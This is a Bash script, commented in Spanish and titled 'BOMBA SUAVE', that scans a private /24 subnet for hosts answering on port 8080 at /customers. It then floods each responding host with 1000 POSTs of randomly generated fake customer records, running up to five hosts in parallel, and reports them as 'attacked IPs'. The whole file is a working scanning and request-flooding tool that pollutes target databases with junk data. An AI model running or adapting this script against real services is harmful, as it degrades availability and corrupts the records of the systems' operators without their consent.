#!/bin/bash
# -------------------------------------------------------------------
# BOMBA SUAVE - Escanea, valida con 1 POST, luego envía 1000 POSTs suaves
# -------------------------------------------------------------------

NETWORK="10.20.68."
PORT=8080
ENDPOINT="/customers"
REQUESTS_PER_IP=1000
DELAY_BETWEEN_REQUESTS=0.05   # 50ms entre cada petición (ajústalo)
MAX_PARALLEL_IPS=5             # Máximo 5 IPs atacadas simultáneamente

# Colores
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${YELLOW}🔥 INICIANDO BOMBA SUAVE 🔥${NC}"
echo -e "Red: ${NETWORK}1-254 | Puerto: ${PORT} | Peticiones por IP: ${REQUESTS_PER_IP}"
echo ""

# Archivos temporales
ALIVE_IPS=$(mktemp)
VALIDATED_IPS=$(mktemp)

# -------------------- PASO 1: ESCANEO CON UN SOLO POST --------------------
echo -e "${YELLOW}[1/2] Escaneando IPs con un POST de prueba...${NC}"

for i in {1..254}; do
  ip="${NETWORK}${i}"
  (
    # Enviar un solo POST con datos únicos
    response=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 2 --max-time 3 \
      -X POST "http://$ip:$PORT$ENDPOINT" \
      -H "Content-Type: application/json" \
      -d "{\"fullName\":\"Test$i\",\"email\":\"test$i@scan.com\",\"phone\":\"3$((i+100000000))\"}")
    
    if [[ "$response" =~ ^2[0-9]{2}$ ]]; then
      echo "$ip" >> "$VALIDATED_IPS"
      echo -e "${GREEN}✔ $ip -> HTTP $response (ACTIVO)${NC}"
    else
      echo -e "${RED}✘ $ip -> HTTP $response${NC}"
    fi
  ) &
  
  # Control de procesos de escaneo (máximo 30 a la vez)
  if (( $(jobs -r | wc -l) >= 30 )); then
    wait -n
  fi
done
wait

TOTAL_IPS=$(wc -l < "$VALIDATED_IPS")
if [ "$TOTAL_IPS" -eq 0 ]; then
  echo -e "${RED}❌ Ninguna IP respondió correctamente. Abortando.${NC}"
  rm -f "$ALIVE_IPS" "$VALIDATED_IPS"
  exit 1
fi

echo -e "${GREEN}✔ Se encontraron $TOTAL_IPS IPs válidas:${NC}"
cat "$VALIDATED_IPS"
echo ""

# -------------------- PASO 2: ENVÍO SUAVE DE 1000 POSTS --------------------
echo -e "${YELLOW}[2/2] Enviando $REQUESTS_PER_IP peticiones a cada IP (suave, con pausas)...${NC}"

# Función para enviar los 1000 posts de forma suave a una IP
send_gentle() {
  local ip=$1
  echo -e "${BLUE}🌊 Comenzando envío a $ip${NC}"
  
  for j in $(seq 1 $REQUESTS_PER_IP); do
    # Datos aleatorios
    FULLNAME="User${RANDOM}"
    EMAIL="user${RANDOM}${j}@test.com"
    PHONE="3$((RANDOM % 900000000 + 100000000))"
    
    curl -s -X POST "http://$ip:$PORT$ENDPOINT" \
      -H "Content-Type: application/json" \
      -d "{\"fullName\":\"$FULLNAME\",\"email\":\"$EMAIL\",\"phone\":\"$PHONE\"}" \
      -o /dev/null -w "%{http_code}" \
      --connect-timeout 1 --max-time 2 2>/dev/null | grep -q '^2' && echo -n "." || echo -n "F"
    
    # Pausa para no saturar
    sleep $DELAY_BETWEEN_REQUESTS
  done
  echo -e "\n${GREEN}✅ Finalizado envío a $ip${NC}"
}

# Lanzar en paralelo para cada IP, pero limitando a MAX_PARALLEL_IPS simultáneas
for ip in $(cat "$VALIDATED_IPS"); do
  send_gentle "$ip" &
  
  # Control: si alcanzamos el límite de IPs en paralelo, esperamos a que termine alguna
  while (( $(jobs -r | wc -l) >= MAX_PARALLEL_IPS )); do
    wait -n
  done
done
wait

# -------------------- RESULTADOS --------------------
echo ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}🎯 BOMBA SUAVE COMPLETADA 🎯${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "IPs atacadas: $TOTAL_IPS"
echo -e "Peticiones por IP: $REQUESTS_PER_IP"
echo -e "Total peticiones enviadas: $((TOTAL_IPS * REQUESTS_PER_IP))"
echo -e "Delay entre peticiones: ${DELAY_BETWEEN_REQUESTS}s"

# Limpiar
rm -f "$ALIVE_IPS" "$VALIDATED_IPS"